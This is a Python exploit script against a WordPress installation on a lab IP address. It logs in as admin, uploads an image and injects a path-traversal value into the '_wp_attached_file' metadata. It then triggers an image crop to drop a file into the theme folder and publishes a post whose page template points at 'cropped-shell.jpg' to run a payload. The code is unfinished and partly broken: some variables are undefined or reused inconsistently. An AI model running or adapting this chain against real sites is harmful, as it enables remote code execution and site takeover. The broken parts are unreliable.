import requests
from bs4 import BeautifulSoup as BS
import base64
from datetime import datetime 
from urllib.parse import urlparse
from io import StringIO
import csv
import re

url = 'http://192.168.94.133:8000/'
username = 'admin'
pwd = 'admin'
payload = 'picture.jpg'

def grabFileNameAfterUpload(url):
	htmlDoc = s.get(url)
	soup = BS(htmlDoc.content,features='html.parser')
	soup.prettify()
	fileName = soup.find_all(p,{'class':'filename'})
	print(fileName)

def grabCSRFToken(url):
	htmlDoc = s.get(url)
	soup = BS(htmlDoc.content,features='html.parser')
	soup.prettify()
	form = soup.find('form')
	#print(form.find_all('input'))
	csrfToken = form.find('input',{'id':'_wpnonce'})['value']
	return csrfToken

def grabTheme(url):
	htmlDoc = requests.get(url)
	soup = BS(htmlDoc.content,features='html.parser')
	links = soup.find_all('link', {'rel':'stylesheet'})
	for link in links:
		parsed = urlparse(link['href'])
		pos = parsed.path.find('theme')
		if(pos != -1):
			path = parsed.path[pos+6:]
			f = StringIO(path)
			reader = csv.reader(f,delimiter='/')
			return next(reader)[1]
				
def grabCSRFTokenEdit(url):
	response = s.get(url)
	#Yanking the CSRF Token out the hardway :v
	soup=BS(response.content,features='html.parser')
	form = soup.find_all('form')
	csrfToken = form[1].find('input',{'id':'_wpnonce'})['value']
	return csrfToken
	
def grabAjaxCSRFToken(url):
	response = s.get(url)
	#Yanking the CSRF Token out the hardway :v
	soup=BS(response.content,features='html.parser')
	inputs = []
	paragraphs = soup.find_all('p')
	for paragraph in paragraphs:
		input = paragraph.find('input')
		if input != None:
			inputs.append(input)
	string = inputs[0]['onclick']
	matchObj = re.search( r'\b[a-z0-9]{10}\b',string)
	return matchObj.group()
	
s = requests.session()


with (s):
	#Logs in to the admin site with creds
	print('[+] Logging in with creds')
	creds = {
		'log': username,
		'pwd': pwd,
		'wp-submit':'Log+In'
	}
	s.post(url+'wp-login.php', creds)
	
	
	#Upload an image
	uploadData = {
		'name':'evil.jpg',
		'post_id': 0, # Always be like this since this is an upload?
		'_wpnonce': grabCSRFToken(url+'wp-admin/media-new.php'), #Rip from the page :v
		'short': 1,
		'type': 'pepega',
		'tab' : 'pepehands',
	}
	#Maybe write payload to path?
	
	payload = {'async-upload':open(payload,'rb')} #Image doesn't contain payload yet 
	response =  s.post(url+'wp-admin/async-upload.php',files=payload,data=uploadData)
	postId = response.content.decode('ascii')
	print('[+] Image Uploaded. postID='+postId)
	#postId='33'
	
	input('Enter to continue...')
	#Edit the image and inject _wp_attachment_file
	#This header is also necessary for ajax requests (or not?)
	header ={
		'Referer': url+'wp-admin/post.php?post='+postId+'&action=edit'
	}
	editData = {
		'_wpnonce': grabCSRFTokenEdit(url+'wp-admin/post.php?post='+postId+'&action=edit'),
		'action': 'editpost',
		'post_ID': postId,
		'post_title': 'lul',
		'meta_input[_wp_attached_file]': datetime.today().strftime('%Y')+'/'+datetime.today().strftime('%m')+'/'+payload+'?/../../../../themes/' + grabTheme(url)+'/shell'
		#'meta_input[_wp_attached_file]': datetime.today().strftime('%Y')+'/'+datetime.today().strftime('%m')+'/picture.jpg?/any'
		#The file name is hardcoded here
	}
	
	s.post(url+'wp-admin/post.php',data=editData,headers=header)
	print('[+]_wp_attachment_file injected')
	'''
	postId = '39'
	header ={
		'Referer': url+'wp-admin/post.php?post='+postId+'&action=edit'
	}
	print(grabCSRFTokenEdit(url+'wp-admin/post-new.php'))
	'''
	input('Enter to continue...')
	#Initiate a crop
	cropData ={
		'action': 'crop-image',
		'_ajax_nonce': grabAjaxCSRFToken(url+'wp-admin/post.php?post='+postId+'&action=edit'), #nonce is correct
		'id': postId,
		'cropDetails[width]': 1,
		'cropDetails[height]': 1,		#An array containing the dimension x,y,width,height,dst_width,dst_height
	}
	#url = 'http://192.168.94.133:8002/'
	response = s.post(url+'wp-admin/admin-ajax.php',data=cropData)
	print('[+]Crop initiated')
	print(BS(response.content,features='html.parser').prettify())
	
	#Publish the post
	publishData = {
		'publish':'Publish',
		'_wpnonce': grabCSRFTokenEdit(url+'wp-admin/post-new.php'), #This grab is valid
		'post_ID':  post_Id,
		'visibility':'public',
		'post_title': 'LUL',
		'status': 'draft',
		'post_author_override':1,
		'post_password':'wootwoot',
		'meta_input[_wp_page_template]': 'cropped-shell.jpg',
	}
	response = s.post(url+'wp-admin/post.php',data=publishData);
	print('Visit the newly published post "LUL" to trigger the payload. The password is "wootwoot"')
	
	


	
